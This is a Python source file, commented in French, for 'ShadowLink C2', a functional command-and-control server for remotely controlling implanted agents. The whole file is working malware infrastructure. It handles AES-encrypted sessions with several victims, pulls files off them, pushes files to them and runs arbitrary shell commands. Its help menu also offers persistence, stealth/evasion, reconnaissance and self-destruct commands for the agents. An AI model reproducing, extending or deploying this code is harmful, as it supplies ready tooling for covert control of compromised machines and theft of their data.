#!/usr/bin/env python3
"""
ShadowLink C2 Server
Phase 7: File Transfer + Process Management
"""
import socket
import os
import struct
import threading
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad
from Crypto.Random import get_random_bytes

# Configuration
AES_KEY = b'ShadowLinkAES256SecretKey32Bytes'
HOST = "127.0.0.1"
PORT = 4444
RECV_BUFFER = 65535
FILE_CHUNK_SIZE = 4096

# Stockage des agents connectés
agents = {}  # {agent_id: {"socket": socket, "ip": ip, "port": port, "connected_at": datetime}}
agents_lock = threading.Lock()
current_agent_id = None


# ============================================
# FONCTIONS DE CHIFFREMENT
# ============================================

def aes_encrypt(data: bytes) -> bytes:
    """Chiffre les données avec AES-256-CBC"""
    iv = get_random_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    return iv + encrypted

def aes_decrypt(data: bytes) -> bytes:
    """Déchiffre les données avec AES-256-CBC"""
    iv = data[:16]
    encrypted = data[16:]
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
    return decrypted


# ============================================
# GESTION DES AGENTS
# ============================================

def generate_agent_id():
    """Génère un ID unique pour l'agent"""
    with agents_lock:
        if not agents:
            return 1
        return max(agents.keys()) + 1

def add_agent(client_socket, address):
    """Ajoute un nouvel agent à la liste"""
    agent_id = generate_agent_id()
    with agents_lock:
        agents[agent_id] = {
            "socket": client_socket,
            "ip": address[0],
            "port": address[1],
            "connected_at": datetime.now()
        }
    return agent_id

def remove_agent(agent_id):
    """Supprime un agent de la liste"""
    with agents_lock:
        if agent_id in agents:
            try:
                agents[agent_id]["socket"].close()
            except:
                pass
            del agents[agent_id]

def list_agents():
    """Affiche la liste des agents connectés"""
    with agents_lock:
        if not agents:
            print("\n[-] Aucun agent connecté\n")
            return
        
        print("\n╔════════════════════════════════════════════════════════════╗")
        print("║                    AGENTS CONNECTÉS                          ║")
        print("╠════╦═══════════════════╦═══════╦═════════════════════════════╣")
        print("║ ID ║        IP         ║ Port  ║      Connecté depuis        ║")
        print("╠════╬═══════════════════╬═══════╬═════════════════════════════╣")
        
        for agent_id, info in agents.items():
            connected = info["connected_at"].strftime("%Y-%m-%d %H:%M:%S")
            marker = " *" if agent_id == current_agent_id else "  "
            print(f"║{marker}{agent_id:<2}║ {info['ip']:<17} ║ {info['port']:<5} ║ {connected:<27} ║")
        
        print("╚════╩═══════════════════╩═══════╩═════════════════════════════╝")
        print("  * = agent sélectionné\n")


# ============================================
# GESTION DES FICHIERS
# ============================================

def save_recon_report(data: bytes, client_ip: str) -> str:
    """Sauvegarde le rapport recon dans un fichier"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"recon_{client_ip}_{timestamp}.txt"
    os.makedirs("reports", exist_ok=True)
    filepath = os.path.join("reports", filename)
    with open(filepath, "wb") as f:
        f.write(data)
    return filepath


# ============================================
# FILE TRANSFER
# ============================================

def download_file_from_agent(agent_socket, remote_path: str) -> tuple:
    """
    Télécharge un fichier depuis l'agent.
    Retourne (success, filepath_or_error)
    """
    try:
        # Envoyer la commande download
        cmd = f"download {remote_path}"
        encrypted_cmd = aes_encrypt(cmd.encode("utf-8"))
        agent_socket.send(encrypted_cmd)
        
        # Recevoir les métadonnées
        agent_socket.settimeout(30)
        meta_response = agent_socket.recv(RECV_BUFFER)
        agent_socket.settimeout(None)
        
        if not meta_response:
            return False, "Pas de réponse de l'agent"
        
        decrypted_meta = aes_decrypt(meta_response).decode("utf-8")
        
        # Vérifier si erreur
        if decrypted_meta.startswith("ERROR:"):
            return False, decrypted_meta[6:]
        
        # Parser la taille: "OK:<size>"
        if not decrypted_meta.startswith("OK:"):
            return False, f"Réponse inattendue: {decrypted_meta}"
        
        file_size = int(decrypted_meta[3:])
        print(f"[*] Taille du fichier: {file_size} bytes")
        
        # Envoyer ACK
        ack = aes_encrypt(b"ACK")
        agent_socket.send(ack)
        
        # Recevoir les chunks
        os.makedirs("downloads", exist_ok=True)
        filename = os.path.basename(remote_path)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        local_path = os.path.join("downloads", f"{timestamp}_{filename}")
        
        with open(local_path, "wb") as f:
            total_received = 0
            
            while True:
                # Recevoir la taille du chunk (4 bytes)
                chunk_size_data = agent_socket.recv(4)
                if len(chunk_size_data) != 4:
                    break
                
                chunk_size = struct.unpack("<I", chunk_size_data)[0]
                
                if chunk_size == 0:
                    break  # Fin du transfert
                
                # Recevoir le chunk chiffré
                encrypted_chunk = b""
                while len(encrypted_chunk) < chunk_size:
                    part = agent_socket.recv(chunk_size - len(encrypted_chunk))
                    if not part:
                        break
                    encrypted_chunk += part
                
                # Déchiffrer et écrire
                decrypted_chunk = aes_decrypt(encrypted_chunk)
                f.write(decrypted_chunk)
                total_received += len(decrypted_chunk)
        
        return True, local_path
        
    except Exception as e:
        return False, str(e)


def upload_file_to_agent(agent_socket, local_path: str, remote_path: str) -> tuple:
    """
    Envoie un fichier vers l'agent.
    Retourne (success, message)
    """
    try:
        # Vérifier que le fichier existe
        if not os.path.exists(local_path):
            return False, f"Fichier local introuvable: {local_path}"
        
        file_size = os.path.getsize(local_path)
        
        # Envoyer la commande upload
        cmd = f"upload {remote_path}"
        encrypted_cmd = aes_encrypt(cmd.encode("utf-8"))
        agent_socket.send(encrypted_cmd)
        
        # Envoyer les métadonnées
        meta = f"SIZE:{file_size}"
        encrypted_meta = aes_encrypt(meta.encode("utf-8"))
        agent_socket.send(encrypted_meta)
        
        # Attendre le READY
        agent_socket.settimeout(30)
        ready_response = agent_socket.recv(RECV_BUFFER)
        agent_socket.settimeout(None)
        
        if not ready_response:
            return False, "Pas de réponse de l'agent"
        
        decrypted_ready = aes_decrypt(ready_response).decode("utf-8")
        
        if decrypted_ready.startswith("ERROR:"):
            return False, decrypted_ready[6:]
        
        if decrypted_ready != "READY":
            return False, f"Réponse inattendue: {decrypted_ready}"
        
        # Envoyer le fichier par chunks
        with open(local_path, "rb") as f:
            while True:
                chunk = f.read(FILE_CHUNK_SIZE - 32)  # -32 pour padding + IV
                if not chunk:
                    break
                
                encrypted_chunk = aes_encrypt(chunk)
                chunk_size = len(encrypted_chunk)
                
                # Envoyer la taille puis le chunk
                agent_socket.send(struct.pack("<I", chunk_size))
                agent_socket.send(encrypted_chunk)
        
        # Envoyer le marqueur de fin
        agent_socket.send(struct.pack("<I", 0))
        
        # Recevoir la confirmation
        agent_socket.settimeout(30)
        confirm = agent_socket.recv(RECV_BUFFER)
        agent_socket.settimeout(None)
        
        if confirm:
            decrypted_confirm = aes_decrypt(confirm).decode("utf-8", errors="replace")
            return True, decrypted_confirm
        
        return True, "Fichier envoyé"
        
    except Exception as e:
        return False, str(e)


# ============================================
# THREAD D'ACCEPTATION DES CONNEXIONS
# ============================================

def accept_connections(server_socket):
    """Thread qui accepte les nouvelles connexions"""
    while True:
        try:
            client_socket, address = server_socket.accept()
            agent_id = add_agent(client_socket, address)
            print(f"\n[+] Nouvel agent connecté: ID={agent_id}, IP={address[0]}:{address[1]}")
            print("Shell> ", end="", flush=True)
        except OSError:
            break


# ============================================
# INTERACTION AVEC UN AGENT
# ============================================

def send_command_to_agent(agent_id, command):
    """Envoie une commande à un agent et retourne la réponse"""
    with agents_lock:
        if agent_id not in agents:
            return None, "Agent non trouvé"
        agent_socket = agents[agent_id]["socket"]
    
    try:
        # Envoyer la commande chiffrée
        encrypted_cmd = aes_encrypt(command.encode("utf-8"))
        agent_socket.send(encrypted_cmd)
        
        # Recevoir la réponse
        agent_socket.settimeout(120)
        response = agent_socket.recv(RECV_BUFFER)
        agent_socket.settimeout(None)
        
        if not response:
            return None, "Agent déconnecté"
        
        decrypted = aes_decrypt(response)
        return decrypted, None
        
    except socket.timeout:
        return None, "Timeout - pas de réponse"
    except Exception as e:
        return None, f"Erreur: {e}"


# ============================================
# AIDE
# ============================================

def print_help():
    """Affiche l'aide du serveur"""
    print("""
╔══════════════════════════════════════════════════════════╗
║              SHADOWLINK C2 - SERVER HELP                 ║
╠══════════════════════════════════════════════════════════╣
║  GESTION DES AGENTS:                                     ║
║    agents / list    - Liste les agents connectés         ║
║    select <id>      - Sélectionne un agent               ║
║    deselect         - Désélectionne l'agent              ║
║    kill <id>        - Déconnecte un agent                ║
║    killall          - Déconnecte tous les agents         ║
║                                                          ║
║  PROCESS MANAGEMENT:                                     ║
║    ps               - List processes on agent            ║
║    kill <pid>       - Kill process by PID (agent-side)   ║
║                                                          ║
║  FILE TRANSFER:                                          ║
║    download <path>  - Download file from agent           ║
║    upload <src> <dst> - Upload file to agent             ║
║                                                          ║
║  COMMANDES AGENT:                                        ║
║    recon            - Full system reconnaissance         ║
║    persist          - Install persistence                ║
║    unpersist        - Remove persistence                 ║
║    checkpersist     - Check persistence status           ║
║    stealth on/off   - Enable/disable evasion             ║
║    checksec         - Run security checks                ║
║    selfdestruct     - Delete agent from disk & exit      ║
║    exit             - Disconnect agent (will reconnect)  ║
║    die              - Kill agent permanently             ║
║    <cmd>            - Execute shell command              ║
║                                                          ║
║  SERVEUR:                                                ║
║    help             - Show this help                     ║
║    quit             - Quit server                        ║
╚══════════════════════════════════════════════════════════╝
    """)


# ============================================
# BOUCLE PRINCIPALE
# ============================================

def main():
    global current_agent_id
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    
    print(f"[*] Serveur en écoute sur {HOST}:{PORT}")
    print("[*] En attente d'agents...\n")
    
    # Lancer le thread d'acceptation des connexions
    accept_thread = threading.Thread(target=accept_connections, args=(server,), daemon=True)
    accept_thread.start()
    
    try:
        while True:
            # Afficher le prompt
            if current_agent_id:
                with agents_lock:
                    if current_agent_id in agents:
                        ip = agents[current_agent_id]["ip"]
                        prompt = f"[Agent-{current_agent_id}@{ip}]> "
                    else:
                        current_agent_id = None
                        prompt = "Shell> "
            else:
                prompt = "Shell> "
            
            try:
                command = input(prompt).strip()
            except EOFError:
                break
            
            if not command:
                continue
            
            # ========== COMMANDES SERVEUR ==========
            
            if command.lower() in ["help", "?"]:
                print_help()
                continue
            
            if command.lower() in ["quit", "q"]:
                print("[*] Fermeture du serveur...")
                break
            
            if command.lower() in ["agents", "list", "ls"]:
                list_agents()
                continue
            
            if command.lower().startswith("select "):
                try:
                    agent_id = int(command.split()[1])
                    with agents_lock:
                        if agent_id in agents:
                            current_agent_id = agent_id
                            print(f"[+] Agent {agent_id} sélectionné")
                        else:
                            print(f"[-] Agent {agent_id} non trouvé")
                except (ValueError, IndexError):
                    print("[-] Usage: select <id>")
                continue
            
            if command.lower() == "deselect":
                current_agent_id = None
                print("[*] Aucun agent sélectionné")
                continue
            
            if command.lower().startswith("kill "):
                try:
                    agent_id = int(command.split()[1])
                    send_command_to_agent(agent_id, "die")
                    remove_agent(agent_id)
                    print(f"[+] Agent {agent_id} terminé")
                    if current_agent_id == agent_id:
                        current_agent_id = None
                except (ValueError, IndexError):
                    print("[-] Usage: kill <id>")
                continue
            
            if command.lower() == "killall":
                with agents_lock:
                    agent_ids = list(agents.keys())
                for aid in agent_ids:
                    send_command_to_agent(aid, "die")
                    remove_agent(aid)
                current_agent_id = None
                print("[+] Tous les agents terminés")
                continue
            
            # ========== COMMANDES AGENT ==========
            
            if current_agent_id is None:
                print("[-] Aucun agent sélectionné. Utilisez 'agents' puis 'select <id>'")
                continue
            
            with agents_lock:
                if current_agent_id not in agents:
                    print("[-] L'agent sélectionné n'est plus connecté")
                    current_agent_id = None
                    continue
                agent_ip = agents[current_agent_id]["ip"]
                agent_socket = agents[current_agent_id]["socket"]
            
            # ========== FILE TRANSFER COMMANDS ==========
            
            # Download: download <remote_path>
            if command.lower().startswith("download "):
                remote_path = command[9:].strip()
                if not remote_path:
                    print("[-] Usage: download <remote_path>")
                    continue
                
                print(f"[*] Téléchargement de {remote_path}...")
                success, result = download_file_from_agent(agent_socket, remote_path)
                
                if success:
                    print(f"[+] Fichier sauvegardé: {result}")
                else:
                    print(f"[-] Erreur: {result}")
                continue
            
            # Upload: upload <local_path> <remote_path>
            if command.lower().startswith("upload "):
                parts = command[7:].strip().split(" ", 1)
                if len(parts) < 2:
                    print("[-] Usage: upload <local_path> <remote_path>")
                    continue
                
                local_path, remote_path = parts[0], parts[1]
                print(f"[*] Envoi de {local_path} vers {remote_path}...")
                success, result = upload_file_to_agent(agent_socket, local_path, remote_path)
                
                if success:
                    print(f"[+] {result}")
                else:
                    print(f"[-] Erreur: {result}")
                continue
            
            # ========== REGULAR COMMANDS ==========
            
            if command.lower() == "recon":
                print("[*] Recon en cours...")
            else:
                print("[*] Commande envoyée...")
            
            response, error = send_command_to_agent(current_agent_id, command)
            
            if error:
                print(f"[-] {error}")
                if "déconnecté" in error.lower() or "Erreur" in error:
                    remove_agent(current_agent_id)
                    current_agent_id = None
                continue
            
            if command.lower() == "recon":
                filepath = save_recon_report(response, agent_ip)
                print(f"[+] Rapport sauvegardé: {filepath}")
            
            print(response.decode("utf-8", errors="replace"))
            
            if command.lower() in ["exit", "die", "selfdestruct"]:
                if command.lower() in ["die", "selfdestruct"]:
                    remove_agent(current_agent_id)
                current_agent_id = None
    
    except KeyboardInterrupt:
        print("\n[*] Interruption...")
    finally:
        with agents_lock:
            for aid in list(agents.keys()):
                try:
                    agents[aid]["socket"].close()
                except:
                    pass
        server.close()
        print("[*] Serveur fermé")


if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║           SHADOWLINK C2 SERVER - Phase 7                 ║
║         File Transfer + Process Management               ║
╚══════════════════════════════════════════════════════════╝
    """)
    main()
